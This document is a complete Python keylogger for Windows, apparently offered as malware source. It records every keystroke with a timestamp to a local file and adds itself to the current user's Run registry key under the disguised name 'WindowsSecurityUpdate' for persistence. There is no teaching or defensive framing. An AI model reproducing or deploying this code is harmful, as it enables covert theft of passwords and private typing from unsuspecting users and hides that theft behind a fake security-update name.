import os
import sys
import winreg  # Registry access
from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"
APP_NAME = "WindowsSecurityUpdate"  # disguised name in registry

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    add_to_startup()  # setup persistence
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
